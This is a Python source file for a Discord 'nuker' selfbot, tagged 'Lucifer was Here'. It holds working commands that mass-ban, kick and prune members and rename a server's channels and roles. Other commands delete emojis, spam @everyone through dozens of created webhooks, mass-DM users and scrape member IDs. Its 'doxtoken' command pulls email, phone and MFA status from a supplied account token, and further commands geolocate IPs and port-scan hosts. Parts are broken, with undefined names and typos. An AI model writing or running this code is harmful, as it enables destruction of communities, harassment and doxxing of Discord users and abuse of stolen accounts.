import os
os.system("pip install discord && pip install colorama && pip install pypresence && pip install dhooks && clear")
import discord
from discord.ext import commands
import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from itertools import cycle
import requests
import sys
import threading
import datetime
import json
import aiohttp
from colorama import Fore           
import time
from pypresence import Presence
import subprocess,base64, codecs, smtplib
# import jishaku 
import socket
from dhooks import Webhook, Webhook
from keep_alive import keep_alive
import discord
from discord.ext import commands
import time
import datetime
import os
import colorama
from colorama import Fore
import requests
import json

token = input("token: ")
prefix = input("prefix: ")

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, intents=intents)

@client.event()
async def on_ready():
    print(f"logged in as {client.user}")


@client.command(aliases=["roles"])
async def getroles(ctx):
   
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.reply(roleStr, mention_author=True)

@client.command(aliases=["renameserver", "rs"])
async def servername(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)

@client.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    
    for channel in ctx.guild.channels:
        await channel.edit(name=name)

@client.command(aliases=["rr"])
async def renameroles(ctx, *, name):
    
    for role in ctx.guild.roles:
        await role.edit(name=name)


@client.command()
async def scrape(ctx):
  await ctx.message.delete()
  mem = ctx.guild.members
  for member in mem:
      try:
        print("scraped")
        mfil = open("members.txt","a")

        mfil.write(str(member.id) + "\n")
        mfil.close()

      except Exception as e:
        print("error",e)

@client.command()
async def massdm(ctx, *, x):
	await ctx.reply("**MASS DM**", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(x)
			await ctx.reply(f"**MASS DM** > {channel}", mention_author=True)
		except:
			continue 

@client.command()
async def channelfuckery(ctx):
      for i in range(500):
        r = requests.patch(f'https://discord.com/api/v9/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'}, 
            'preferred_locale': 'en-US', 
            'public_updates_channel_id': None, 'rules_channel_id': None})
        y = requests.patch(f'https://discord.com/api/v9/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})

@client.command(aliases=["deleteemojis"])
async def delemojis(ctx):
   
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            return 

           
@client.command()
async def massban(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('Massban Started')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.put(f"https://discord.com/api/v7/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command()
async def masskick(ctx, guild):
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('MASS KICK')
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()

@client.command(aliases=["massunban"])
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('Unbanning {} members'.format(len(banlist)), mention_author=True)
    for users in banlist:
            await ctx.guild.unban(user=users.user)

@client.command()
async def prune(ctx):
    await ctx.reply("Pruning....")
    time.sleep(2)
    await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
    time.sleep(1)
    await ctx.reply("Successfully Pruned.")

@client.command()
async def nuke(ctx):
    await ctx.send(f"{prefix}prune")
    await ctx.send(f"{prefix}channelfuckery")
    await ctx.send(f"{prefix}rc Lucifer was Here")
    await ctx.send(f"{prefix}rr Lucifer was Here")
    await ctx.send(f"{prefix}rs Lucifer Was Here")


@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot " + _token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            language = languages.get(locale)
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strtime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"{language}"
                },
                {
                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.send(embed=em)
        except KeyError:
            await ctx.send("Invalid Token, try doxing a valid token..")
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale'] + f"{language}"
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
    return await ctx.send(embed=em)

def ssspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        data = {'content':'@everyone LUCIFER WAS HERE'}
            
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                asyncio.sleep(delay)

        else:
            delay = random.randint(30, 60)
            asyncio.sleep(delay)

@client.command()
async def webhookspam(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0: 
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target = ssspam2, args = (webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels) 
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):  
        for channel in ctx.guild.text_channels:

            try:
            
                webhook =await channel.create_webhook(name='LUCIFER WAS HERE')
                threading.Thread(target = ssspam, args = (webhook.url,)).start()

            except:
                print (f"{Fore.RED} > Webhook Error")


@client.command(
    aliases=['doxip', 'iplookup', 'iptolocation', 'ip2geo', 'ip'])
async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {
            'name': 'IP',
            'value': geo['query']
        },
        {
            'name': 'Type',
            'value': geo['ipType']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'City',
            'value': geo['city']
        },
        {
            'name': 'Continent',
            'value': geo['continent']
        },
        {
            'name': 'Country',
            'value': geo['country']
        },
        {
            'name': 'Hostname',
            'value': geo['ipName']
        },
        {
            'name': 'ISP',
            'value': geo['isp']
        },
        {
            'name': 'Latitute',
            'value': geo['lat']
        },
        {
            'name': 'Longitude',
            'value': geo['lon']
        },
        {
            'name': 'Org',
            'value': geo['org']
        },
        {
            'name': 'Region',
            'value': geo['region']
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=True)
            
    return await ctx.reply(embed=em)

@client.command(name='portscan')
async def portscan(ctx, arg1):
    if arg1 == 'myipwashere!':
     await ctx.reply("invalid ip!")
    else:
       async with aiohttp.BotSession() as session:
                async with session.get(f"https://api.Xtarget.com/nmap/?q={arg1}") as r:
                       if r.status == 200:
                        text = await r.text()
                        embed1 = discord.Embed(title=(f'results from {arg1}'), description=(text), color=discord.Color.from_rgb(0, 191, 255))
                        await ctx.reply(embed=embed1)
                       else:
                           em = discord.Embed(description ="`BR0 WH3N ! W4S ATTC4!NG 0N TH!S !P ! S33N3D 4N 3RR0R WH!CH W4S 0CC_R!NG B3TW33N MY ATTACK S0 J_ST C0NT4CT T0 !X H3 W!LL S0LV3 TH!S ||`")
                           em.set_thumbnail(url=cross_emo)
                           await ctx.reply(embed=em)

@client.command()
async def portscan2(ctx,host):
    ports = requests.get('https://api.hackertarget.com/nmap/?q='+host)
    embed = discord.Embed(title='𝙋𝙤𝙧𝙩 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 𝙍𝙚𝙨𝙪𝙡𝙩𝙨',color=0x000000)
    embed.add_field(name='𝙋𝙤𝙧𝙩 𝙎𝙘𝙖𝙣𝙣𝙚𝙧 𝙍𝙚𝙨𝙪𝙡𝙩𝙨',value=ports.text.replace(',','\n'))
    await ctx.send(embed=embed)

@client.command()
async def lookup(ctx,host):
    geoip = requests.get('http://extreme-ip-lookup.com/json/'+host)
    embed=discord.Embed(title='𝙄𝙋 𝙇𝙤𝙤𝙠𝙪𝙥 𝙍𝙚𝙨𝙪𝙡𝙩𝙨', color=0x000000)
    embed.add_field(name='𝙄𝙋 𝙇𝙤𝙤𝙠𝙪𝙥 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣',value=geoip.text.replace('<br>','\n'),inline=False)
    await ctx.send(embed=embed)

@client.command()
async def dnslookup(ctx,host):
    dns = requests.get('https://api.hackertarget.com/dnslookup/?q='+host)
    embed=discord.Embed(title='𝘿𝙉𝙎 𝙇𝙤𝙤𝙠𝙪𝙥 𝙍𝙚𝙨𝙪𝙡𝙩𝙨', color=0x000000)
    embed.add_field(name='𝘿𝙉𝙎 𝙇𝙤𝙤𝙠𝙪𝙥 𝙍𝙚𝙨𝙪𝙡𝙩𝙨',value=dns.text.replace('<br>','\n'),inline=False)
    await ctx.send(embed=embed)

@client.command()
async def reversedns(ctx,host):
    rev = requests.get('https://api.hackertarget.com/reversedns/?q='+host)
    embed=discord.Embed(title='𝙍𝙚𝙫𝙚𝙧𝙨𝙚 𝘿𝙉𝙎 𝙇𝙤𝙤𝙠𝙪𝙥 𝙍𝙚𝙨𝙪𝙡𝙩𝙨', color=0x000000)
    embed.add_field(name='𝙍𝙚𝙫𝙚𝙧𝙨𝙚 𝘿𝙉𝙎 𝙇𝙤𝙤𝙠𝙪𝙥 𝙍𝙚𝙨𝙪𝙡𝙩𝙨',value=rev.text.replace('<br>','\n'),inline=False)
    await ctx.send(embed=embed)

@client.command(aliases=['trace'])
async def traceip(ctx, *, ip: str = '1.1.1.1'):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=22232633') 
        geo = r.json()
        embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title="**IP Lookup**", color=0xfefefe)
        try:
        	embed.add_field(name="IP", value=geo['query'], inline=False)
        except:
        	embed.add_field(name="IP", value="None", inline=False)
        try:
        	embed.add_field(name="City", value=geo['city'], inline=False)
        except:
        	embed.add_field(name="City", value="None", inline=False)
        try:
        	embed.add_field(name="Region/State", value=geo['regionName'], inline=False)
        except:
        	embed.add_field(name="Region/State", value="None", inline=False)
        try:
        	embed.add_field(name="Country", value=geo['country'], inline=False)
        except:
        	embed.add_field(name="Country", value="None", inline=False)
        try:
        	embed.add_field(name="Continent", value=geo['continent'], inline=False)
        except:
        	embed.add_field(name="Continent", value="None", inline=False)
        try:
        	embed.add_field(name="ISP", value=geo['isp'], inline=False)
        except:
        	embed.add_field(name="ISP", value="None", inline=False)
        try:
        	embed.add_field(name="Organization", value=geo['org'], inline=False)
        except:
        	embed.add_field(name="Organization", value="None", inline=False)
        try:
        	embed.add_field(name="Reverse DNS", value=geo['reverse'], inline=False)
        except:
        	embed.add_field(name="Reverse DNS", value="None", inline=False)
        try:
        	embed.add_field(name="AS", value=geo['as'], inline=False)
        except:
        	embed.add_field(name="AS", value="None", inline=False)
        try:
        	embed.add_field(name="Mobile?", value=geo['mobile'], inline=False)
        except:
        	embed.add_field(name="Mobile?", value="None", inline=False)
        try:
        	embed.add_field(name="Proxy/VPN?", value=geo['proxy'], inline=False)
        except:
        	embed.add_field(name="Proxy/VPN?", value="None", inline=False)
        try:
        	embed.add_field(name="Hosting?", value=geo['hosting'], inline=False)
        except:
        	embed.add_field(name="Hosting?", value="None", inline=False)
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=f'{ctx.author.avatar_url}')
        await ctx.send(embed=embed)
    except:
        await ctx.send('Not A Valid IP/No Info Found!', delete_after=60)

@client.command()
async def icmping(ctx, *, ip: str = '1.1.1.1'):
    headers = {
        'Accept': 'application/json'
    }
    r = requests.get(f'https://check-host.net/check-ping?host={ip}&max_nodes=15', headers=headers).text
    host = json.loads(r)
    embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title="**ICMP Check Host**", color=0xfefefe)
    embed.add_field(name="Link To Report", value=host['permanent_link'], inline=False)
    await ctx.send(embed=embed)

@client.command()
async def tcping(ctx, *, ip: str = '1.1.1.1:443'):
    headers = {
        'Accept': 'application/json'
    }
    r = requests.get(f'https://check-host.net/check-tcp?host={ip}&max_nodes=15', headers=headers).text
    host = json.loads(r)
    embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title="**TCP Check Host**", color=0xfefefe)
    embed.add_field(name="Link To Report", value=host['permanent_link'], inline=False)
    await ctx.send(embed=embed)

@client.command()
async def nmap(ctx, ip: str = '1.1.1.1'):
    if ip == None:
        await ctx.send('You need to enter a IP address to scan!', delete_after=30)
    else:
        scan = requests.get(f'https://api.hackertarget.com/nmap/?q={ip}').text
        embed = discord.Embed(timestamp=datetime.utcnow(), color=0xfefefe)
        embed.add_field(name='Port Scan Results:', value=f'{scan}')
        embed.set_footer(text=f"Requested by {ctx.author}", icon_url=f'{ctx.author.avatar_url}')
        await ctx.send(embed=embed)

client.run(token, bot=False)
